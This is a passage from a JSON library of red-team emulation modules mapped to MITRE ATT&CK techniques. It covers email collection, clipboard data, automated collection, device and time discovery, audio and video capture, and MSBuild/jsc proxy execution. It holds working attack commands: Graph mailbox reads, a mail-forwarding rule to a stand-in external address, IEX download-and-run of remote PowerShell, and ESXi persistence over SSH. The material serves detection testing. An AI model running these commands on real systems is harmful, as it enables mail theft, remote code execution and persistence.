-eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\nforeach ($user in $selectUsers) { $url= \"https://graph.microsoft.com/v1.0/users/$($user)/messages\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\n",
        "elevation_required": false,
        "cleanup_command": "connect-mggraph -Scopes AppRoleAssignment.ReadWrite.All,Application.ReadWrite.All,User.Read -NoWelcome\nRemove-MgApplication $app.AppId\nRemove-Item -Path Cert:\\CurrentUser\\My\\$($cert.thumbprint) -DeleteKey\nDisconnect-MgGraph\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Full username (including @domain) of Entra user w/ AppRoleassignment.ReadWrite.All and Application.ReadWrite.All Scope (eg, Global Administrator Role) and sign-in method is password",
          "type": "string",
          "default_value": null
        },
        {
          "name": "password",
          "description": "Entra user password",
          "type": "string",
          "default_value": null
        },
        {
          "name": "1st_target_mailbox",
          "description": "office-365 target_email_address",
          "type": "string",
          "default_value": null
        },
        {
          "name": "2nd_target_mailbox",
          "description": "office-365 target_email_address",
          "type": "string",
          "default_value": null
        },
        {
          "name": "3rd_target_mailbox",
          "description": "office-365 target_email_address",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft Graph PowerShell SDK must be installed.\n",
          "check_command": "$RequiredModule = Get-InstalledModule Microsoft.Graph\nif (-not $RequiredModule) {exit 1} else {exit 0}\n",
          "install_command": "Install-Module Microsoft.Graph -Scope CurrentUser\n"
        },
        {
          "description": "Az.Accounts module must be installed.\n",
          "check_command": "$RequiredModule2 = Get-InstalledModule Az.Accounts\nif (-not $RequiredModule2) {exit 1} else {exit 0}\n",
          "install_command": "Install-Module Az.Accounts -Scope CurrentUser\n"
        }
      ],
      "rx_module_id": "36657d95-d9d6-4fbf-8a31-f4085607bafd",
      "module_name": "Office365 - Remote Mail Collected"
    },
    {
      "index": 802,
      "technique_id": "T1114.003",
      "technique_name": "Email Collection: Email Forwarding Rule",
      "description": "Creates a new Inbox Rule to forward emails to an external user via the \"ForwardTo\" property of the New-InboxRule Powershell cmdlet.\n",
      "execution": {
        "platforms": [
          "office-365"
        ],
        "executor_type": "powershell",
        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"#{rule_name}\" -ForwardTo \"#{forwarding_email}\"\n",
        "elevation_required": false,
        "cleanup_command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nGet-InboxRule | Where-Object { $_.Name -eq \"#{rule_name}\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "office-365 username",
          "type": "string",
          "default_value": null
        },
        {
          "name": "password",
          "description": "office-365 password",
          "type": "string",
          "default_value": null
        },
        {
          "name": "rule_name",
          "description": "email rule name",
          "type": "string",
          "default_value": "RAGLOX Threat Library Email Rule"
        },
        {
          "name": "forwarding_email",
          "description": "destination email addresses",
          "type": "string",
          "default_value": "RAGLOX_Operator@fakeemail.aq"
        }
      ],
      "prerequisites": [
        {
          "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
          "check_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
          "install_command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n"
        }
      ],
      "rx_module_id": "3234117e-151d-4254-9150-3d0bac41e38c",
      "module_name": "Office365 - Email Forwarding"
    },
    {
      "index": 803,
      "technique_id": "T1115",
      "technique_name": "Clipboard Data",
      "description": "Add data to clipboard to copy off or execute commands from.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n",
        "elevation_required": false,
        "cleanup_command": "del %temp%\\T1115.txt >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0cd14633-58d4-4422-9ede-daa2c9474ae7",
      "module_name": "Utilize Clipboard to store or execute commands from"
    },
    {
      "index": 804,
      "technique_id": "T1115",
      "technique_name": "Clipboard Data",
      "description": "Utilize PowerShell to echo a command to clipboard and execute it\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "echo Get-Process | clip\nGet-Clipboard | iex\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d6dc21af-bec9-4152-be86-326b6babd416",
      "module_name": "Execute Commands from Clipboard using PowerShell"
    },
    {
      "index": 805,
      "technique_id": "T1115",
      "technique_name": "Clipboard Data",
      "description": "Echo a command to clipboard and execute it",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "echo ifconfig | pbcopy\n$(pbpaste)",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1ac2247f-65f8-4051-b51f-b0ccdfaaa5ff",
      "module_name": "Execute commands from clipboard"
    },
    {
      "index": 806,
      "technique_id": "T1115",
      "technique_name": "Clipboard Data",
      "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\raglox_T1115_clipboard_data.txt\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"RAGLOX T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToRagloxModulesFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"$env:TEMP\\raglox_T1115_clipboard_data.txt\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "ms_product",
          "description": "Maldoc application Word",
          "type": "string",
          "default_value": "Word"
        }
      ],
      "prerequisites": [
        {
          "description": "Microsoft #{ms_product} must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "9c8d5a72-9c98-48d3-b9bf-da2cc43bdf52",
      "module_name": "Collect Clipboard Data via VBA"
    },
    {
      "index": 807,
      "technique_id": "T1115",
      "technique_name": "Clipboard Data",
      "description": "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "apt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ee363e53-b083-4230-aff3-f8d955f2d5bb",
      "module_name": "Add or copy content to clipboard with xClip"
    },
    {
      "index": 808,
      "technique_id": "T1119",
      "technique_name": "Automated Collection",
      "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1\ndir c: /b /s .docx | findstr /e .docx\nfor /R c:\\ %f in (*.docx) do copy /Y %f %temp%\\T1119_command_prompt_collection\n",
        "elevation_required": false,
        "cleanup_command": "del %temp%\\T1119_command_prompt_collection /F /Q >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "cb379146-53f1-43e0-b884-7ce2c635ff5b",
      "module_name": "Automated Collection Command Prompt"
    },
    {
      "index": 809,
      "technique_id": "T1119",
      "technique_name": "Automated Collection",
      "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null\nGet-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item $env:TEMP\\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "634bd9b9-dc83-4229-b19f-7f83ba9ad313",
      "module_name": "Automated Collection PowerShell"
    },
    {
      "index": 810,
      "technique_id": "T1119",
      "technique_name": "Automated Collection",
      "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item $env:TEMP\\T1119_1.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_2.txt -ErrorAction Ignore\nRemove-Item $env:TEMP\\T1119_3.txt -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c3f6d794-50dd-482f-b640-0384fbb7db26",
      "module_name": "Recon information for export with PowerShell"
    },
    {
      "index": 811,
      "technique_id": "T1119",
      "technique_name": "Automated Collection",
      "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\RAGLOXRedTeam\\rx_modules > %TEMP%\\T1119_4.txt\n",
        "elevation_required": false,
        "cleanup_command": "del %TEMP%\\T1119_1.txt >nul 2>&1\ndel %TEMP%\\T1119_2.txt >nul 2>&1\ndel %TEMP%\\T1119_3.txt >nul 2>&1\ndel %TEMP%\\T1119_4.txt >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "aa1180e2-f329-4e1e-8625-2472ec0bfaf3",
      "module_name": "Recon information for export with Command Prompt"
    },
    {
      "index": 812,
      "technique_id": "T1120",
      "technique_name": "Peripheral Device Discovery",
      "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt",
        "elevation_required": false,
        "cleanup_command": "Remove-Item $env:TEMP\\T1120_collection.txt -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2cb4dbf2-2dca-4597-8678-4d39d207a3a5",
      "module_name": "Win32_PnPEntity Hardware Inventory"
    },
    {
      "index": 813,
      "technique_id": "T1120",
      "technique_name": "Peripheral Device Discovery",
      "description": "Search for printers / potential vulns using printercheck function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nprintercheck -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "cb6e76ca-861e-4a7f-be08-564caa3e6f75",
      "module_name": "WinPwn - printercheck"
    },
    {
      "index": 814,
      "technique_id": "T1120",
      "technique_name": "Peripheral Device Discovery",
      "description": "Performs pheripheral device discovery utilizing fsutil to list all drives.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "fsutil fsinfo drives",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "424e18fd-48b8-4201-8d3a-bf591523a686",
      "module_name": "Peripheral Device Discovery via fsutil"
    },
    {
      "index": 815,
      "technique_id": "T1120",
      "technique_name": "Peripheral Device Discovery",
      "description": "This test uses PowerShell to list printers on a Windows system, demonstrating a discovery technique attackers might use to \ngather details on connected devices. Using Get-Printer, they can view information on all available printers, identifying \npotential devices for further targeting.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-Printer\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5c876daf-db1e-41cf-988d-139a7443ccd4",
      "module_name": "Get Printer Device List via PowerShell Command"
    },
    {
      "index": 816,
      "technique_id": "T1123",
      "technique_name": "Audio Capture",
      "description": "Uses AudioDeviceCmdlets to set the default recording device and simulate audio capture.\nModule repo: [AudioDeviceCmdlets](https://github.com/frgnca/AudioDeviceCmdlets)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$mic = Get-AudioDevice -Recording\nSet-AudioDevice -ID $mic.ID\nStart-Sleep -Seconds 5\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "AudioDeviceCmdlets module must be installed",
          "check_command": "if (Get-Module -ListAvailable -Name AudioDeviceCmdlets) { exit 0 } else { exit 1 } \n",
          "install_command": "Install with: Install-Module -Name AudioDeviceCmdlets -Force\" \n"
        }
      ],
      "rx_module_id": "9c3ad250-b185-4444-b5a9-d69218a10c95",
      "module_name": "using device audio capture commandlet"
    },
    {
      "index": 817,
      "technique_id": "T1123",
      "technique_name": "Audio Capture",
      "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#raglox.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#raglox.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#raglox.exe /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7a21cce2-6ada-4f7c-afd9-e1e9c481e44a",
      "module_name": "Registry artefact when application use microphone"
    },
    {
      "index": 818,
      "technique_id": "T1123",
      "technique_name": "Audio Capture",
      "description": "Use AppleScript to get Quicktime Player to record an audio file from the default microphone.\n\nShould create a non-empty m4a file with sound from the microphone.\n\n- requires Automation permissions but no additional microphone permissions\n- saves file in /tmp by default. Other locations likely to require more permissions.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sh #{filename} #{audiofile} #{duration}\n",
        "elevation_required": false,
        "cleanup_command": "if test -w #{audiofile}; then\n  rm #{audiofile}\nfi\n"
      },
      "variables": [
        {
          "name": "filename",
          "description": "Location of the script",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1123/src/T1123.sh"
        },
        {
          "name": "audiofile",
          "description": "Location of the recorded audio file",
          "type": "path",
          "default_value": "/tmp/T1123.m4a"
        },
        {
          "name": "duration",
          "description": "Length of recording to make in seconds",
          "type": "integer",
          "default_value": 5
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c7a0bb71-70ce-4a53-b115-881f241b795b",
      "module_name": "using Quicktime Player"
    },
    {
      "index": 819,
      "technique_id": "T1124",
      "technique_name": "System Time Discovery",
      "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net time \\\\#{computer_name}\nw32tm /tz\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "computer_name",
          "description": "computer name to query",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "20aba24b-e61f-4b26-b4ce-4784f763ca20",
      "module_name": "System Time Discovery"
    },
    {
      "index": 820,
      "technique_id": "T1124",
      "technique_name": "System Time Discovery",
      "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-Date\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1d5711d6-655c-4a47-ae9c-6503c74fa877",
      "module_name": "System Time Discovery - PowerShell"
    },
    {
      "index": 821,
      "technique_id": "T1124",
      "technique_name": "System Time Discovery",
      "description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "date\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f449c933-0891-407f-821e-7916a21a1a6f",
      "module_name": "System Time Discovery in FreeBSD/macOS"
    },
    {
      "index": 822,
      "technique_id": "T1124",
      "technique_name": "System Time Discovery",
      "description": "identifies DCRat delay time tactics using w32tm.\nhttps://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/\nhttps://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d5d5a6b0-0f92-42d8-985d-47aafa2dd4db",
      "module_name": "System Time Discovery W32tm as a Delay"
    },
    {
      "index": 823,
      "technique_id": "T1124",
      "technique_name": "System Time Discovery",
      "description": "Displays the current system time via the Windows builtin time command: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/time\nRecently observed in use in the wild during an incident involving Ursnif malware:\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/dc72f0b557fc63347379be0a33439788256761c8/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml\nhttps://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "time\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "53ead5db-7098-4111-bb3f-563be390e72e",
      "module_name": "System Time with Windows time Command"
    },
    {
      "index": 824,
      "technique_id": "T1124",
      "technique_name": "System Time Discovery",
      "description": "Identify the Operating System Time Zone via registry with the reg.exe command.\nUpon execution, the system Time Zone will be shown.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation\" /v TimeZoneKeyName\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "25c5d1f1-a24b-494a-a6c5-5f50a1ae7f47",
      "module_name": "Discover System Time Zone via Registry"
    },
    {
      "index": 825,
      "technique_id": "T1125",
      "technique_name": "Video Capture",
      "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#raglox.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#raglox.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#raglox.exe /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6581e4a7-42e3-43c5-a0d2-5a0d62f9702a",
      "module_name": "Registry artefact when application use webcam"
    },
    {
      "index": 826,
      "technique_id": "T1127",
      "technique_name": "Trusted Developer Utilities Proxy Execution",
      "description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy \"#{filename}\" %TEMP%\\hello.js\n#{jscpath}\\#{jscname} %TEMP%\\hello.js\n",
        "elevation_required": false,
        "cleanup_command": "del %TEMP%\\hello.js\ndel %TEMP%\\hello.exe\n"
      },
      "variables": [
        {
          "name": "filename",
          "description": "Location of the project file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1127\\src\\hello.js"
        },
        {
          "name": "jscpath",
          "description": "Default location of jsc.exe",
          "type": "path",
          "default_value": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"
        },
        {
          "name": "jscname",
          "description": "Default name of jsc",
          "type": "path",
          "default_value": "jsc.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "JavaScript code file must exist on disk at specified location (#{filename})\n",
          "check_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1127/src/hello.js\" -OutFile \"#{filename}\"\n"
        }
      ],
      "rx_module_id": "1ec1c269-d6bd-49e7-b71b-a461f7fa7bc8",
      "module_name": "Lolbin Jsc.exe compile javascript to exe"
    },
    {
      "index": 827,
      "technique_id": "T1127",
      "technique_name": "Trusted Developer Utilities Proxy Execution",
      "description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy \"#{filename}\" %TEMP%\\LibHello.js\n#{jscpath}\\#{jscname} /t:library %TEMP%\\LibHello.js\n",
        "elevation_required": false,
        "cleanup_command": "del %TEMP%\\LibHello.js\ndel %TEMP%\\LibHello.dll\n"
      },
      "variables": [
        {
          "name": "filename",
          "description": "Location of the project file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1127\\src\\LibHello.js"
        },
        {
          "name": "jscpath",
          "description": "Default location of jsc.exe",
          "type": "path",
          "default_value": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"
        },
        {
          "name": "jscname",
          "description": "Default name of jsc",
          "type": "path",
          "default_value": "jsc.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "JavaScript code file must exist on disk at specified location (#{filename})\n",
          "check_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1127/src/LibHello.js\" -OutFile \"#{filename}\"\n"
        }
      ],
      "rx_module_id": "3fc9fea2-871d-414d-8ef6-02e85e322b80",
      "module_name": "Lolbin Jsc.exe compile javascript to dll"
    },
    {
      "index": 828,
      "technique_id": "T1127.001",
      "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild",
      "description": "Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print \"Hello From a Code Fragment\" and \"Hello From a Class.\" to the screen.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{msbuildpath}\\#{msbuildname} \"#{filename}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "filename",
          "description": "Location of the project file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1127.001\\src\\T1127.001.csproj"
        },
        {
          "name": "msbuildpath",
          "description": "Default location of MSBuild",
          "type": "path",
          "default_value": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"
        },
        {
          "name": "msbuildname",
          "description": "Default name of MSBuild",
          "type": "path",
          "default_value": "msbuild.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Project file must exist on disk at specified location (#{filename})\n",
          "check_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1127.001/src/T1127.001.csproj\" -OutFile \"#{filename}\"\n"
        }
      ],
      "rx_module_id": "58742c0f-cb01-44cd-a60b-fb26e8871c93",
      "module_name": "MSBuild Bypass Using Inline Tasks (C#)"
    },
    {
      "index": 829,
      "technique_id": "T1127.001",
      "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild",
      "description": "Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print \"Hello from a Visual Basic inline task!\" to the screen.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{msbuildpath}\\#{msbuildname} \"#{filename}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "filename",
          "description": "Location of the project file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1127.001\\src\\vb.xml"
        },
        {
          "name": "msbuildpath",
          "description": "Default location of MSBuild",
          "type": "path",
          "default_value": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319"
        },
        {
          "name": "msbuildname",
          "description": "Default name of MSBuild",
          "type": "path",
          "default_value": "msbuild.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Project file must exist on disk at specified location (#{filename})\n",
          "check_command": "if (Test-Path \"#{filename}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{filename}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1127.001/src/vb.xml\" -OutFile \"#{filename}\"\n"
        }
      ],
      "rx_module_id": "ab042179-c0c5-402f-9bc8-42741f5ce359",
      "module_name": "MSBuild Bypass Using Inline Tasks (VB)"
    },
    {
      "index": 830,
      "technique_id": "T1129",
      "technique_name": "Server Software Component",
      "description": "An adversary can maintain persistence within an ESXi host by installing malicious vSphere Installation Bundles (VIBs).\n[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-malware-persistence)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp\necho \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{vib_install}\"\n",
        "elevation_required": false,
        "cleanup_command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{vib_remove}\"\n"
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default_value": "pass"
        },
        {
          "name": "plink_file",
          "description": "Path to plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "name": "pscp_file",
          "description": "Path to Pscp",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\pscp.exe"
        },
        {
